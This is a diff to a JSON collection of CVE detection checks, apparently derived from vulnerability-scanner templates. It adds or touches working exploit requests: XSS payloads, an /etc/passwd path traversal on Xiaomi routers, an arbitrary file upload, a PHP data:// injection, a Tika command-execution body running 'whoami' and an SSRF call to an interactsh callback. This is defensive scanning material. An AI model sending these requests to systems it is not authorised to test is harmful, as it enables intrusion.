@@ -2910,6 +2910,20 @@
       ]
     },
     {
+      "id": "CVE-2013-6281",
+      "info": {
+        "name": "WordPress Spreadsheet - dhtmlxspreadsheet Plugin Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2013-7091",
       "info": {
         "name": "Zimbra Collaboration Server 7.2.2/8.0.2 Local File Inclusion",
@@ -6300,11 +6314,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -6868,6 +6882,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wicket/resource/nl.planon.pssm.dashboard.cre.engine.wicket.page.AbstractDashboardPage/html/nodata.html?nodatamsg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-18608",
+      "info": {
+        "name": "DedeCMS V5.7 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plus/feedback.php/rp4hu%27><script>alert%28document.domain%29<%2fscript>?aid=3"
           ]
         }
       ]
@@ -8583,6 +8612,21 @@
       ]
     },
     {
+      "id": "CVE-2019-18371",
+      "info": {
+        "name": "Xiaomi routers - Local file inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api-third-party/download/extdisks../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-18393",
       "info": {
         "name": "Openfire LFI",
@@ -9280,8 +9324,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -15312,8 +15356,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -16722,6 +16766,22 @@
       ]
     },
     {
+      "id": "CVE-2021-45428",
+      "info": {
+        "name": "Telesquare TLR-2005KSH 1.0.0 - Arbitrary File Upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /{{randstr}}.txt HTTP/1.1\nHost: {{Hostname}}\n",
+            "PUT /{{randstr}}.txt HTTP/1.1\nHost: {{Hostname}}\n\nCVE-2021-45428\n",
+            "GET /{{randstr}}.txt HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-45967",
       "info": {
         "name": "Pascom CPS Server-Side Request Forgery",
@@ -17024,6 +17084,22 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0346",
+      "info": {
+        "name": "Google XML Sitemap Generator < 2.0.4 - Reflected Cross-Site Scripting & RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?p=1&xsg-provider=data://text/html,%3C?php%20phpinfo();%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp",
+            "{{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp"
           ]
         }
       ]
@@ -17332,7 +17408,7 @@
       ]
     },
     {
-      "id": "CVE-2022-1598",
+      "id": "CVE-2022-1597",
       "info": {
         "name": "WPQA < 5.4 - Reflected Cross-Site Scripting",
         "severity": "medium"
@@ -17883,7 +17959,7 @@
       "id": "CVE-2022-30489",
       "info": {
         "name": "Wavlink Wn535g3 - POST XSS",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
